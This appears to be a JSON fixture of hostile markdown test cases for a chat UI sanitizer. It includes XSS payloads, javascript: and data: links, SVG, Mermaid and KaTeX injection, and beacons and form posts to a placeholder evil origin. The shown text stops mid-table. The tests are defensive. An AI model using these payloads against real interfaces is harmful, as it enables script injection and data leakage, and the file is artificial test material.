@@ -1,0 +1,791 @@
+{
+  "corpusFormatVersion": 1,
+  "description": "Hostile markdown and media corpus. Each item is served as an AG-UI run at POST /agui/hostile/<id>. Global checks for every item: the __kmXss sentinel is never called, no dialog opens, the page never navigates, the evil origin receives zero requests, no element carries an on* attribute, and globalForbiddenSelectors never match inside the transcript.",
+  "globalForbiddenSelectors": [
+    "script",
+    "iframe",
+    "frame",
+    "object",
+    "embed",
+    "applet",
+    "base",
+    "meta",
+    "link[rel]",
+    "form",
+    "a[href^='javascript:' i]",
+    "a[href^='vbscript:' i]",
+    "a[href^='data:' i]",
+    "[href^='javascript:' i]",
+    "[src^='javascript:' i]",
+    "[src*='{{EVIL_ORIGIN}}']",
+    "[href*='{{EVIL_ORIGIN}}']"
+  ],
+  "items": [
+    {
+      "id": "xss-script-tag",
+      "category": "xss-html",
+      "title": "Inline <script> between words",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Hello <script>__kmXss('xss-script-tag')</script> world, the meeting starts at 10.",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Text 'Hello' and 'world' render; no script element exists and nothing executes.",
+      "assert": {
+        "mustShowText": [
+          "Hello",
+          "world"
+        ]
+      }
+    },
+    {
+      "id": "xss-mixed-case-script",
+      "category": "xss-html",
+      "title": "Mixed-case and attribute-laden script tag",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Before <ScRiPt type=\"module\" src=\"{{EVIL_ORIGIN}}/beacon/mixed-script.js\">__kmXss('xss-mixed-case-script')</sCrIpT> after",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No script element; no request to the evil origin; surrounding text renders.",
+      "assert": {
+        "mustShowText": [
+          "Before",
+          "after"
+        ]
+      }
+    },
+    {
+      "id": "xss-img-onerror",
+      "category": "xss-html",
+      "title": "Raw <img onerror>",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Look: <img src=x onerror=\"__kmXss('xss-img-onerror')\"> done.",
+        "chunking": "words"
+      },
+      "expectedOutcome": "The img is removed or rendered without any on* attribute; onerror never fires.",
+      "assert": {
+        "mustShowText": [
+          "Look:",
+          "done."
+        ]
+      }
+    },
+    {
+      "id": "xss-svg-onload-inline",
+      "category": "xss-html",
+      "title": "Inline <svg onload> in markdown",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Chart: <svg onload=\"__kmXss('xss-svg-onload-inline')\" width=\"10\" height=\"10\"><circle r=\"5\"/></svg>",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Raw inline SVG is stripped (or sanitized without event handlers). Nothing executes.",
+      "assert": {
+        "mustShowText": [
+          "Chart:"
+        ]
+      }
+    },
+    {
+      "id": "xss-iframe-srcdoc",
+      "category": "xss-html",
+      "title": "<iframe srcdoc> with script",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Embed: <iframe srcdoc=\"<script>parent.__kmXss('xss-iframe-srcdoc')</script>\"></iframe> end",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No iframe exists in the transcript.",
+      "assert": {
+        "forbiddenSelectors": [
+          "iframe"
+        ],
+        "mustShowText": [
+          "Embed:"
+        ]
+      }
+    },
+    {
+      "id": "xss-details-ontoggle",
+      "category": "xss-html",
+      "title": "<details open ontoggle>",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "<details open ontoggle=\"__kmXss('xss-details-ontoggle')\"><summary>Spoiler</summary>secret</details>",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Either details is stripped or kept without ontoggle; the handler never runs.",
+      "assert": {}
+    },
+    {
+      "id": "xss-style-exfil",
+      "category": "xss-html",
+      "title": "Inline style with an external url() beacon",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "<div style=\"background:url({{EVIL_ORIGIN}}/beacon/style-bg.png)\">styled text</div>",
+        "chunking": "words"
+      },
+      "expectedOutcome": "The style attribute is dropped; the evil origin receives no request; 'styled text' may render as text.",
+      "assert": {
+        "forbiddenSelectors": [
+          "[style*='url(']"
+        ]
+      }
+    },
+    {
+      "id": "xss-md-image-attr-breakout",
+      "category": "xss-html",
+      "title": "Markdown image alt/title attribute breakout",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "![x\" onerror=\"__kmXss('xss-md-image-attr-breakout')](http://nonexistent.invalid/a.png \"t\\\" onload=\\\"__kmXss('xss-md-image-attr-breakout')\")",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Alt/title are escaped attribute values; no handler attribute is created. The non-allowlisted host is not requested.",
+      "assert": {}
+    },
+    {
+      "id": "xss-form-action",
+      "category": "xss-html",
+      "title": "<form action> to the evil origin",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "<form action=\"{{EVIL_ORIGIN}}/form\" method=\"post\"><input name=\"q\" value=\"x\"><button>Submit</button></form>",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No form, input or button from content; nothing can be submitted.",
+      "assert": {
+        "forbiddenSelectors": [
+          "form",
+          "input[name='q']"
+        ]
+      }
+    },
+    {
+      "id": "xss-meta-refresh-base",
+      "category": "xss-html",
+      "title": "<meta http-equiv=refresh> and <base href>",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "<meta http-equiv=\"refresh\" content=\"0;url={{EVIL_ORIGIN}}/meta\"><base href=\"{{EVIL_ORIGIN}}/\">Relative [link](notes/7).",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No meta or base element; the page does not navigate; the relative link does not resolve to the evil origin.",
+      "assert": {
+        "forbiddenSelectors": [
+          "meta",
+          "base",
+          "a[href^='{{EVIL_ORIGIN}}']"
+        ]
+      }
+    },
+    {
+      "id": "xss-split-script-stream",
+      "category": "streaming-fragment",
+      "title": "<script> split across one-character deltas",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Split <script>__kmXss('xss-split-script-stream')</script> tag across deltas.",
+        "chunking": "chars"
+      },
+      "expectedOutcome": "Incremental parsing never materialises a script element at any intermediate state.",
+      "assert": {
+        "mustShowText": [
+          "Split",
+          "tag across deltas."
+        ]
+      }
+    },
+    {
+      "id": "link-javascript-inline",
+      "category": "link-scheme",
+      "title": "Inline javascript: link",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "[Open the notes](javascript:__kmXss('link-javascript-inline'))",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Rendered as plain text or a link whose href is not javascript:. Activating it runs nothing.",
+      "assert": {
+        "mustShowText": [
+          "Open the notes"
+        ]
+      }
+    },
+    {
+      "id": "link-javascript-entity",
+      "category": "link-scheme",
+      "title": "Entity-obfuscated javascript: in raw HTML anchor",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "<a href=\"&#106;avascript:__kmXss('link-javascript-entity')\">entity link</a>",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No anchor with a javascript: href after entity decoding.",
+      "assert": {}
+    },
+    {
+      "id": "link-data-html",
+      "category": "link-scheme",
+      "title": "data:text/html and vbscript: links",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "[data](data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX19rbVhzcygnbGluay1kYXRhLWh0bWwnKTwvc2NyaXB0Pg==) and [vb](vbscript:msgbox(1))",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No anchor with data: or vbscript: href.",
+      "assert": {
+        "mustShowText": [
+          "data",
+          "vb"
+        ]
+      }
+    },
+    {
+      "id": "link-reference-style-js",
+      "category": "link-scheme",
+      "title": "Reference-style link definition to javascript:",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "See [the summary][s].\n\n[s]: javascript:__kmXss('link-reference-style-js') \"Summary\"",
+        "chunking": "words"
+      },
+      "expectedOutcome": "The reference resolves to a safe (non-javascript) href or plain text.",
+      "assert": {
+        "mustShowText": [
+          "the summary"
+        ]
+      }
+    },
+    {
+      "id": "link-autolink-js",
+      "category": "link-scheme",
+      "title": "Autolink with javascript: scheme",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Autolink: <javascript:__kmXss('link-autolink-js')>",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Not linkified with a javascript: href.",
+      "assert": {}
+    },
+    {
+      "id": "link-https-allowed",
+      "category": "link-scheme",
+      "title": "Ordinary https link (control: must still work)",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Read [the spec](https://know-me.tools/docs/spec-42) before Thursday.",
+        "chunking": "words"
+      },
+      "expectedOutcome": "An anchor with the exact https href renders. If it opens a new tab it has rel containing noopener and noreferrer.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "a[href='https://know-me.tools/docs/spec-42']",
+            "count": 1
+          }
+        ]
+      }
+    },
+    {
+      "id": "svg-fence-script",
+      "category": "raw-svg",
+      "title": "```svg fence containing <script>",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"40\" height=\"40\"><script>__kmXss('svg-fence-script')</script><circle cx=\"20\" cy=\"20\" r=\"10\"/></svg>\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "Shown as a code block, or rendered through a sanitizer (DOMPurify SVG profile) with the script removed.",
+      "assert": {
+        "forbiddenSelectors": [
+          "svg script"
+        ]
+      }
+    },
+    {
+      "id": "svg-foreign-object",
+      "category": "raw-svg",
+      "title": "SVG foreignObject smuggling HTML",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject width=\"100\" height=\"50\"><img xmlns=\"http://www.w3.org/1999/xhtml\" src=\"x\" onerror=\"__kmXss('svg-foreign-object')\"/><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"{{EVIL_ORIGIN}}/beacon/fo-iframe\"></iframe></foreignObject></svg>\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "No foreignObject from content survives (or it survives without img/iframe); nothing executes; no evil request.",
+      "assert": {
+        "forbiddenSelectors": [
+          "foreignObject img",
+          "foreignObject iframe"
+        ]
+      }
+    },
+    {
+      "id": "svg-external-refs",
+      "category": "raw-svg",
+      "title": "SVG <image> and <use> pointing at the evil origin",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image href=\"{{EVIL_ORIGIN}}/beacon/svg-image.png\" width=\"10\" height=\"10\"/><use xlink:href=\"{{EVIL_ORIGIN}}/sprite.svg#icon\"/></svg>\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "External references are stripped; the evil origin receives zero requests.",
+      "assert": {}
+    },
+    {
+      "id": "svg-anchor-and-animate",
+      "category": "raw-svg",
+      "title": "SVG <a xlink:href=javascript:> and <animate> setting href",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:__kmXss('svg-anchor-and-animate')\"><text x=\"0\" y=\"15\">click</text></a><a><animate attributeName=\"href\" to=\"javascript:__kmXss('svg-anchor-and-animate')\"/><text y=\"30\">x</text></a></svg>\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "No javascript: href and no animate/set element targeting href.",
+      "assert": {
+        "forbiddenSelectors": [
+          "animate[attributeName='href']",
+          "set[attributeName='href']"
+        ]
+      }
+    },
+    {
+      "id": "mermaid-html-label",
+      "category": "mermaid",
+      "title": "Mermaid node label with HTML injection",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```mermaid\ngraph TD\n  A[\"<img src=x onerror=__kmXss('mermaid-html-label')>Label\"] --> B[Next]\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "Diagram renders (securityLevel strict); the label HTML is escaped or stripped; nothing executes.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "svg",
+            "minCount": 1
+          }
+        ]
+      }
+    },
+    {
+      "id": "mermaid-click-javascript",
+      "category": "mermaid",
+      "title": "Mermaid click directive with javascript: href and callback",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```mermaid\ngraph LR\n  A[Start] --> B[End]\n  click A href \"javascript:__kmXss('mermaid-click-javascript')\"\n  click B call __kmXss(\"mermaid-click-javascript\")\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "Click bindings are ignored; no javascript: href and no onclick on any node.",
+      "assert": {}
+    },
+    {
+      "id": "mermaid-init-loose",
+      "category": "mermaid",
+      "title": "Mermaid %%init%% directive trying to set securityLevel loose",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```mermaid\n%%{init: {\"securityLevel\": \"loose\", \"startOnLoad\": true}}%%\ngraph TD\n  A[One] --> B[Two]\n  click A href \"javascript:__kmXss('mermaid-init-loose')\"\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "The directive cannot lower securityLevel; still no javascript: href.",
+      "assert": {}
+    },
+    {
+      "id": "mermaid-syntax-error",
+      "category": "mermaid",
+      "title": "Mermaid syntax error",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "```mermaid\ngraph TD\n  A -->> -- ((( broken\n```",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "A contained error or the source as code; the rest of the transcript keeps working; no global mermaid error SVG appended to <body>.",
+      "assert": {}
+    },
+    {
+      "id": "mermaid-custom-chunk",
+      "category": "mermaid",
+      "title": "km.mermaid CUSTOM chunk with injected label and click",
+      "delivery": {
+        "kind": "custom",
+        "markdown": "The decision flow is attached.",
+        "name": "km.mermaid",
+        "value": {
+          "messageId": "msg-hostile-1",
+          "diagramId": "dia-hostile",
+          "source": "graph TD\n  A[\"<iframe src={{EVIL_ORIGIN}}/beacon/mermaid-iframe></iframe>\"] --> B\n  click B href \"javascript:__kmXss('mermaid-custom-chunk')\""
+        }
+      },
+      "expectedOutcome": "Same rules as the markdown fence: no iframe, no javascript: href, no evil request.",
+      "assert": {
+        "forbiddenSelectors": [
+          "iframe"
+        ]
+      }
+    },
+    {
+      "id": "katex-valid",
+      "category": "katex",
+      "title": "Valid inline and display math (control)",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Inline $E = mc^2$ and display:\n\n$$\n\\int_0^1 x^2\\,dx = \\tfrac{1}{3}\n$$",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "KaTeX renders both (elements with class katex).",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": ".katex",
+            "minCount": 2
+          }
+        ]
+      }
+    },
+    {
+      "id": "katex-href-javascript",
+      "category": "katex",
+      "title": "KaTeX \\href with javascript: and \\url",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "$\\href{javascript:__kmXss('katex-href-javascript')}{\\text{click}}$ and $\\url{javascript:__kmXss('katex-href-javascript')}$",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "KaTeX trust is off: rendered as an error/plain text, never an anchor with javascript: href.",
+      "assert": {}
+    },
+    {
+      "id": "katex-html-extensions",
+      "category": "katex",
+      "title": "KaTeX \\htmlData / \\includegraphics to evil origin",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "$\\htmlData{onclick=__kmXss('katex-html-extensions')}{x}$ $\\includegraphics{{{EVIL_ORIGIN}}/beacon/katex.png}$",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "Untrusted commands are refused; no evil request; no on* attributes.",
+      "assert": {}
+    },
+    {
+      "id": "katex-macro-bomb",
+      "category": "katex",
+      "title": "KaTeX macro expansion bomb",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "$\\def\\a{\\b\\b\\b\\b\\b\\b\\b\\b}\\def\\b{\\c\\c\\c\\c\\c\\c\\c\\c}\\def\\c{\\d\\d\\d\\d\\d\\d\\d\\d}\\def\\d{xxxxxxxx}\\a\\a\\a\\a$",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "KaTeX maxExpand stops it with an error; the UI stays responsive (message completes within budget).",
+      "assert": {
+        "finalizeWithinMs": 3000
+      }
+    },
+    {
+      "id": "stream-unclosed-fence",
+      "category": "streaming-fragment",
+      "title": "Code fence that never closes",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Here is the config:\n\n```ts\nexport const room = { name: \"Atlas\", seats: 6 };\nconst unfinished = [",
+        "chunking": "chars"
+      },
+      "expectedOutcome": "During and after streaming the open fence renders as a code block (incomplete-markdown repair); text after it is not swallowed into prose.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "pre code",
+            "minCount": 1
+          }
+        ],
+        "mustShowText": [
+          "Here is the config:"
+        ]
+      }
+    },
+    {
+      "id": "stream-partial-table",
+      "category": "streaming-fragment",
+      "title": "Table cut off mid-row",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "| Name | Role |\n| --- | --- |\n| Ana | host |\n| Ben | gu",
+        "chunking": "chars"
+      },
+      "expectedOutcome": "Renders a table with the complete row; the partial row may render as text; no layout explosion.",
+      "assert": {
+        "mustShowText": [
+          "Ana",
+          "host"
+        ]
+      }
+    },
+    {
+      "id": "stream-unclosed-math",
+      "category": "streaming-fragment",
+      "title": "Display math that never closes",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "The estimate:\n\n$$\n\\sum_{i=1}^{n} h_i = ",
+        "chunking": "chars"
+      },
+      "expectedOutcome": "No KaTeX crash; the fragment shows as text or a pending math block; following messages render normally.",
+      "assert": {
+        "mustShowText": [
+          "The estimate:"
+        ]
+      }
+    },
+    {
+      "id": "stream-split-link-emphasis",
+      "category": "streaming-fragment",
+      "title": "Link and emphasis split across single-character deltas",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Please **review [the summary](https://know-me.tools/meet/notes/7)** today and _confirm_.",
+        "chunking": "chars"
+      },
+      "expectedOutcome": "The final render has bold text containing an anchor with the exact href; intermediate states never create a broken href.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "a[href='https://know-me.tools/meet/notes/7']",
+            "count": 1
+          },
+          {
+            "selector": "strong",
+            "minCount": 1
+          }
+        ]
+      }
+    },
+    {
+      "id": "stream-dangling-html",
+      "category": "streaming-fragment",
+      "title": "Dangling HTML open tag at end of stream",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Status: done <div class=\"x\" onclick=\"__kmXss('stream-dangling-html')\"",
+        "chunking": "chars"
+      },
+      "expectedOutcome": "Rendered as text or dropped; never becomes an element with a handler.",
+      "assert": {
+        "mustShowText": [
+          "Status: done"
+        ]
+      }
+    },
+    {
+      "id": "huge-table",
+      "category": "huge-table",
+      "title": "GFM table with 400 rows x 8 columns",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "Transcript index:\n\n| # | Speaker | Start | End | Words | Sentiment | Topic | Note |\n|---:|---|---|---|---:|---|---|---|\n| 1 | P1 | 10:00 | 10:01 | 0 | positive | topic-0 | row 1 **bold** `code` |\n| 2 | P2 | 10:01 | 10:02 | 37 | neutral | topic-1 | row 2 **bold** `code` |\n| 3 | P3 | 10:02 | 10:03 | 74 | neutral | topic-2 | row 3 **bold** `code` |\n| 4 | P4 | 10:03 | 10:04 | 111 | positive | topic-3 | row 4 **bold** `code` |\n| 5 | P5 | 10:04 | 10:05 | 148 | neutral | topic-4 | row 5 **bold** `code` |\n| 6 | P6 | 10:05 | 10:06 | 185 | neutral | topic-5 | row 6 **bold** `code` |\n| 7 | P7 | 10:06 | 10:07 | 222 | positive | topic-6 | row 7 **bold** `code` |\n| 8 | P1 | 10:07 | 10:08 | 259 | neutral | topic-7 | row 8 **bold** `code` |\n| 9 | P2 | 10:08 | 10:09 | 296 | neutral | topic-8 | row 9 **bold** `code` |\n| 10 | P3 | 10:09 | 10:10 | 33 | positive | topic-9 | row 10 **bold** `code` |\n| 11 | P4 | 10:10 | 10:11 | 70 | neutral | topic-10 | row 11 **bold** `code` |\n| 12 | P5 | 10:11 | 10:12 | 107 | neutral | topic-11 | row 12 **bold** `code` |\n| 13 | P6 | 10:12 | 10:13 | 144 | positive | topic-0 | row 13 **bold** `code` |\n| 14 | P7 | 10:13 | 10:14 | 181 | neutral | topic-1 | row 14 **bold** `code` |\n| 15 | P1 | 10:14 | 10:15 | 218 | neutral | topic-2 | row 15 **bold** `code` |\n| 16 | P2 | 10:15 | 10:16 | 255 | positive | topic-3 | row 16 **bold** `code` |\n| 17 | P3 | 10:16 | 10:17 | 292 | neutral | topic-4 | row 17 **bold** `code` |\n| 18 | P4 | 10:17 | 10:18 | 29 | neutral | topic-5 | row 18 **bold** `code` |\n| 19 | P5 | 10:18 | 10:19 | 66 | positive | topic-6 | row 19 **bold** `code` |\n| 20 | P6 | 10:19 | 10:20 | 103 | neutral | topic-7 | row 20 **bold** `code` |\n| 21 | P7 | 10:20 | 10:21 | 140 | neutral | topic-8 | row 21 **bold** `code` |\n| 22 | P1 | 10:21 | 10:22 | 177 | positive | topic-9 | row 22 **bold** `code` |\n| 23 | P2 | 10:22 | 10:23 | 214 | neutral | topic-10 | row 23 **bold** `code` |\n| 24 | P3 | 10:23 | 10:24 | 251 | neutral | topic-11 | row 24 **bold** `code` |\n| 25 | P4 | 10:24 | 10:25 | 288 | positive | topic-0 | row 25 **bold** `code` |\n| 26 | P5 | 10:25 | 10:26 | 25 | neutral | topic-1 | row 26 **bold** `code` |\n| 27 | P6 | 10:26 | 10:27 | 62 | neutral | topic-2 | row 27 **bold** `code` |\n| 28 | P7 | 10:27 | 10:28 | 99 | positive | topic-3 | row 28 **bold** `code` |\n| 29 | P1 | 10:28 | 10:29 | 136 | neutral | topic-4 | row 29 **bold** `code` |\n| 30 | P2 | 10:29 | 10:30 | 173 | neutral | topic-5 | row 30 **bold** `code` |\n| 31 | P3 | 10:30 | 10:31 | 210 | positive | topic-6 | row 31 **bold** `code` |\n| 32 | P4 | 10:31 | 10:32 | 247 | neutral | topic-7 | row 32 **bold** `code` |\n| 33 | P5 | 10:32 | 10:33 | 284 | neutral | topic-8 | row 33 **bold** `code` |\n| 34 | P6 | 10:33 | 10:34 | 21 | positive | topic-9 | row 34 **bold** `code` |\n| 35 | P7 | 10:34 | 10:35 | 58 | neutral | topic-10 | row 35 **bold** `code` |\n| 36 | P1 | 10:35 | 10:36 | 95 | neutral | topic-11 | row 36 **bold** `code` |\n| 37 | P2 | 10:36 | 10:37 | 132 | positive | topic-0 | row 37 **bold** `code` |\n| 38 | P3 | 10:37 | 10:38 | 169 | neutral | topic-1 | row 38 **bold** `code` |\n| 39 | P4 | 10:38 | 10:39 | 206 | neutral | topic-2 | row 39 **bold** `code` |\n| 40 | P5 | 10:39 | 10:40 | 243 | positive | topic-3 | row 40 **bold** `code` |\n| 41 | P6 | 10:40 | 10:41 | 280 | neutral | topic-4 | row 41 **bold** `code` |\n| 42 | P7 | 10:41 | 10:42 | 17 | neutral | topic-5 | row 42 **bold** `code` |\n| 43 | P1 | 10:42 | 10:43 | 54 | positive | topic-6 | row 43 **bold** `code` |\n| 44 | P2 | 10:43 | 10:44 | 91 | neutral | topic-7 | row 44 **bold** `code` |\n| 45 | P3 | 10:44 | 10:45 | 128 | neutral | topic-8 | row 45 **bold** `code` |\n| 46 | P4 | 10:45 | 10:46 | 165 | positive | topic-9 | row 46 **bold** `code` |\n| 47 | P5 | 10:46 | 10:47 | 202 | neutral | topic-10 | row 47 **bold** `code` |\n| 48 | P6 | 10:47 | 10:48 | 239 | neutral | topic-11 | row 48 **bold** `code` |\n| 49 | P7 | 10:48 | 10:49 | 276 | positive | topic-0 | row 49 **bold** `code` |\n| 50 | P1 | 10:49 | 10:50 | 13 | neutral | topic-1 | row 50 **bold** `code` |\n| 51 | P2 | 10:50 | 10:51 | 50 | neutral | topic-2 | row 51 **bold** `code` |\n| 52 | P3 | 10:51 | 10:52 | 87 | positive | topic-3 | row 52 **bold** `code` |\n| 53 | P4 | 10:52 | 10:53 | 124 | neutral | topic-4 | row 53 **bold** `code` |\n| 54 | P5 | 10:53 | 10:54 | 161 | neutral | topic-5 | row 54 **bold** `code` |\n| 55 | P6 | 10:54 | 10:55 | 198 | positive | topic-6 | row 55 **bold** `code` |\n| 56 | P7 | 10:55 | 10:56 | 235 | neutral | topic-7 | row 56 **bold** `code` |\n| 57 | P1 | 10:56 | 10:57 | 272 | neutral | topic-8 | row 57 **bold** `code` |\n| 58 | P2 | 10:57 | 10:58 | 9 | positive | topic-9 | row 58 **bold** `code` |\n| 59 | P3 | 10:58 | 10:59 | 46 | neutral | topic-10 | row 59 **bold** `code` |\n| 60 | P4 | 10:59 | 10:00 | 83 | neutral | topic-11 | row 60 **bold** `code` |\n| 61 | P5 | 10:00 | 10:01 | 120 | positive | topic-0 | row 61 **bold** `code` |\n| 62 | P6 | 10:01 | 10:02 | 157 | neutral | topic-1 | row 62 **bold** `code` |\n| 63 | P7 | 10:02 | 10:03 | 194 | neutral | topic-2 | row 63 **bold** `code` |\n| 64 | P1 | 10:03 | 10:04 | 231 | positive | topic-3 | row 64 **bold** `code` |\n| 65 | P2 | 10:04 | 10:05 | 268 | neutral | topic-4 | row 65 **bold** `code` |\n| 66 | P3 | 10:05 | 10:06 | 5 | neutral | topic-5 | row 66 **bold** `code` |\n| 67 | P4 | 10:06 | 10:07 | 42 | positive | topic-6 | row 67 **bold** `code` |\n| 68 | P5 | 10:07 | 10:08 | 79 | neutral | topic-7 | row 68 **bold** `code` |\n| 69 | P6 | 10:08 | 10:09 | 116 | neutral | topic-8 | row 69 **bold** `code` |\n| 70 | P7 | 10:09 | 10:10 | 153 | positive | topic-9 | row 70 **bold** `code` |\n| 71 | P1 | 10:10 | 10:11 | 190 | neutral | topic-10 | row 71 **bold** `code` |\n| 72 | P2 | 10:11 | 10:12 | 227 | neutral | topic-11 | row 72 **bold** `code` |\n| 73 | P3 | 10:12 | 10:13 | 264 | positive | topic-0 | row 73 **bold** `code` |\n| 74 | P4 | 10:13 | 10:14 | 1 | neutral | topic-1 | row 74 **bold** `code` |\n| 75 | P5 | 10:14 | 10:15 | 38 | neutral | topic-2 | row 75 **bold** `code` |\n| 76 | P6 | 10:15 | 10:16 | 75 | positive | topic-3 | row 76 **bold** `code` |\n| 77 | P7 | 10:16 | 10:17 | 112 | neutral | topic-4 | row 77 **bold** `code` |\n| 78 | P1 | 10:17 | 10:18 | 149 | neutral | topic-5 | row 78 **bold** `code` |\n| 79 | P2 | 10:18 | 10:19 | 186 | positive | topic-6 | row 79 **bold** `code` |\n| 80 | P3 | 10:19 | 10:20 | 223 | neutral | topic-7 | row 80 **bold** `code` |\n| 81 | P4 | 10:20 | 10:21 | 260 | neutral | topic-8 | row 81 **bold** `code` |\n| 82 | P5 | 10:21 | 10:22 | 297 | positive | topic-9 | row 82 **bold** `code` |\n| 83 | P6 | 10:22 | 10:23 | 34 | neutral | topic-10 | row 83 **bold** `code` |\n| 84 | P7 | 10:23 | 10:24 | 71 | neutral | topic-11 | row 84 **bold** `code` |\n| 85 | P1 | 10:24 | 10:25 | 108 | positive | topic-0 | row 85 **bold** `code` |\n| 86 | P2 | 10:25 | 10:26 | 145 | neutral | topic-1 | row 86 **bold** `code` |\n| 87 | P3 | 10:26 | 10:27 | 182 | neutral | topic-2 | row 87 **bold** `code` |\n| 88 | P4 | 10:27 | 10:28 | 219 | positive | topic-3 | row 88 **bold** `code` |\n| 89 | P5 | 10:28 | 10:29 | 256 | neutral | topic-4 | row 89 **bold** `code` |\n| 90 | P6 | 10:29 | 10:30 | 293 | neutral | topic-5 | row 90 **bold** `code` |\n| 91 | P7 | 10:30 | 10:31 | 30 | positive | topic-6 | row 91 **bold** `code` |\n| 92 | P1 | 10:31 | 10:32 | 67 | neutral | topic-7 | row 92 **bold** `code` |\n| 93 | P2 | 10:32 | 10:33 | 104 | neutral | topic-8 | row 93 **bold** `code` |\n| 94 | P3 | 10:33 | 10:34 | 141 | positive | topic-9 | row 94 **bold** `code` |\n| 95 | P4 | 10:34 | 10:35 | 178 | neutral | topic-10 | row 95 **bold** `code` |\n| 96 | P5 | 10:35 | 10:36 | 215 | neutral | topic-11 | row 96 **bold** `code` |\n| 97 | P6 | 10:36 | 10:37 | 252 | positive | topic-0 | row 97 **bold** `code` |\n| 98 | P7 | 10:37 | 10:38 | 289 | neutral | topic-1 | row 98 **bold** `code` |\n| 99 | P1 | 10:38 | 10:39 | 26 | neutral | topic-2 | row 99 **bold** `code` |\n| 100 | P2 | 10:39 | 10:40 | 63 | positive | topic-3 | row 100 **bold** `code` |\n| 101 | P3 | 10:40 | 10:41 | 100 | neutral | topic-4 | row 101 **bold** `code` |\n| 102 | P4 | 10:41 | 10:42 | 137 | neutral | topic-5 | row 102 **bold** `code` |\n| 103 | P5 | 10:42 | 10:43 | 174 | positive | topic-6 | row 103 **bold** `code` |\n| 104 | P6 | 10:43 | 10:44 | 211 | neutral | topic-7 | row 104 **bold** `code` |\n| 105 | P7 | 10:44 | 10:45 | 248 | neutral | topic-8 | row 105 **bold** `code` |\n| 106 | P1 | 10:45 | 10:46 | 285 | positive | topic-9 | row 106 **bold** `code` |\n| 107 | P2 | 10:46 | 10:47 | 22 | neutral | topic-10 | row 107 **bold** `code` |\n| 108 | P3 | 10:47 | 10:48 | 59 | neutral | topic-11 | row 108 **bold** `code` |\n| 109 | P4 | 10:48 | 10:49 | 96 | positive | topic-0 | row 109 **bold** `code` |\n| 110 | P5 | 10:49 | 10:50 | 133 | neutral | topic-1 | row 110 **bold** `code` |\n| 111 | P6 | 10:50 | 10:51 | 170 | neutral | topic-2 | row 111 **bold** `code` |\n| 112 | P7 | 10:51 | 10:52 | 207 | positive | topic-3 | row 112 **bold** `code` |\n| 113 | P1 | 10:52 | 10:53 | 244 | neutral | topic-4 | row 113 **bold** `code` |\n| 114 | P2 | 10:53 | 10:54 | 281 | neutral | topic-5 | row 114 **bold** `code` |\n| 115 | P3 | 10:54 | 10:55 | 18 | positive | topic-6 